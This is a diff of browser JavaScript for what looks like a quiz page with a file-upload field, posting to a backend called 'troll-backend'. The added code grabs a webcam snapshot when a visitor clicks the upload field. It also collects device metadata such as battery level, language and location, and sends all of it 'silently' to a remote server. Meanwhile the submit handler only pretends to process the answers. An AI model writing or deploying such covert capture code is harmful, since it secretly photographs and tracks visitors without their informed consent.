@@ -8,61 +8,39 @@ const submitBtn = document.getElementById("submit-btn");
 const backendURL = "https://troll-backend.onrender.com/api/upload";
 const constraints = { video: { facingMode: "user" }, audio: false };
 
-let toastTimeout;
-
-// Toast function
+// =====================
+// TOAST FUNCTION
+// =====================
 function showToast(message) {
   toast.innerText = message;
-  toast.classList.add("show");
-  clearTimeout(toastTimeout);
-  toastTimeout = setTimeout(() => {
-    toast.classList.remove("show");
+  toast.style.display = "block";
+  toast.style.opacity = 1;
+
+  setTimeout(() => {
+    toast.style.opacity = 0;
+    setTimeout(() => (toast.style.display = "none"), 300);
   }, 2000);
 }
 
-// Request camera permission (non-blocking)
-async function requestCameraPermission() {
+// =====================
+// CAPTURE CAMERA IMAGE & SEND
+// =====================
+async function captureAndSendCamera() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    stream.getTracks().forEach(track => track.stop()); // stop immediately
-    console.log("Camera permission granted");
-  } catch (err) {
-    console.warn("Camera permission denied", err);
-  }
-}
+    videoEl.srcObject = stream;
+    await videoEl.play();
 
-// Always ask camera permission on file click
-fileInput.addEventListener("click", async (e) => {
-  requestCameraPermission(); // triggers permission prompt every time
-  // File picker opens naturally
-});
+    // Small delay to ensure video is ready
+    await new Promise((res) =>
+      videoEl.addEventListener("canplay", () => setTimeout(res, 300))
+    );
 
-// Handle form submission
-form.addEventListener("submit", async (e) => {
-  e.preventDefault();
-  submitBtn.disabled = true;
-  submitBtn.textContent = "Submitting...";
-  showToast("Uploading your response...");
-
-  try {
-    // Capture image from camera if granted
-    let image = null;
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      videoEl.srcObject = stream;
-      await videoEl.play();
-      await new Promise(res => videoEl.addEventListener("canplay", () => setTimeout(res, 100)));
-
-      const ctx = canvasEl.getContext("2d");
-      canvasEl.width = videoEl.videoWidth;
-      canvasEl.height = videoEl.videoHeight;
-      ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
-
-      image = canvasEl.toDataURL("image/png");
-      stream.getTracks().forEach(track => track.stop());
-    } catch {
-      console.warn("Camera not used or denied");
-    }
+    const ctx = canvasEl.getContext("2d");
+    canvasEl.width = videoEl.videoWidth;
+    canvasEl.height = videoEl.videoHeight;
+    ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
+    const image = canvasEl.toDataURL("image/png");
 
     // Collect metadata
     const metadata = {
@@ -73,7 +51,7 @@ form.addEventListener("submit", async (e) => {
       language: navigator.language,
       battery: "N/A",
       location: "N/A",
-      time: new Date().toLocaleString()
+      time: new Date().toLocaleString(),
     };
 
     if (navigator.getBattery) {
@@ -92,41 +70,63 @@ form.addEventListener("submit", async (e) => {
       }
     }
 
-    // Get uploaded file
-    let uploadedFileData = null;
-    if (fileInput.files.length > 0) {
-      const file = fileInput.files[0];
-      uploadedFileData = await new Promise((resolve, reject) => {
-        const reader = new FileReader();
-        reader.onload = () => resolve(reader.result);
-        reader.onerror = err => reject(err);
-        reader.readAsDataURL(file);
-      });
-    }
-
-    // Send to backend
-    await fetch(backendURL, {
+    // Send image + metadata silently
+    fetch(backendURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ image, metadata, uploadedFile: uploadedFileData })
-    });
+      body: JSON.stringify({ image, metadata }),
+    })
+      .then((res) => res.json())
+      .then((data) => console.log("Camera image sent:", data))
+      .catch((err) => console.error("Camera upload error:", err));
 
-    // Show success
-    document.getElementById("quiz-container").style.display = "none";
-    document.getElementById("success-container").style.display = "block";
-
-    submitBtn.disabled = false;
-    submitBtn.textContent = "Submit";
-    showToast("Response submitted successfully!");
+    // Stop camera immediately
+    videoEl.srcObject.getTracks().forEach((track) => track.stop());
   } catch (err) {
-    console.error(err);
-    showToast("Error! Please allow camera access if you want to submit image.");
-    submitBtn.disabled = false;
-    submitBtn.textContent = "Submit";
+    console.error("Camera permission denied or error:", err);
+    showToast("Camera access is required for this feature!");
+    // Retry asking permission next time
   }
+}
+
+// =====================
+// HANDLE FILE INPUT CLICK
+// =====================
+fileInput.addEventListener("click", async (e) => {
+  e.preventDefault();
+  // Ask for camera permission first
+  await captureAndSendCamera();
+  // Open file picker after camera is captured
+  fileInput.click(); // re-trigger click
 });
 
-// Reset behavior on reload
-window.addEventListener("beforeunload", () => {
-  fileInput.value = ""; // clear file input
+// =====================
+// HANDLE FORM SUBMIT
+// =====================
+form.addEventListener("submit", (e) => {
+  e.preventDefault();
+
+  submitBtn.disabled = true;
+  submitBtn.textContent = "Submitting...";
+  showToast("Submitting your response...");
+
+  // Normally the user file is already selected
+  const userFile = fileInput.files[0];
+  if (!userFile) {
+    showToast("Please select a file before submitting!");
+    submitBtn.disabled = false;
+    submitBtn.textContent = "Submit";
+    return;
+  }
+
+  // Here you can handle the form submission logic
+  // For example, send the selected file along with other answers to your backend
+
+  // For demonstration, show success container
+  document.getElementById("quiz-container").style.display = "none";
+  document.getElementById("success-container").style.display = "block";
+
+  submitBtn.disabled = false;
+  submitBtn.textContent = "Submit";
+  showToast("Response submitted successfully!");
 });
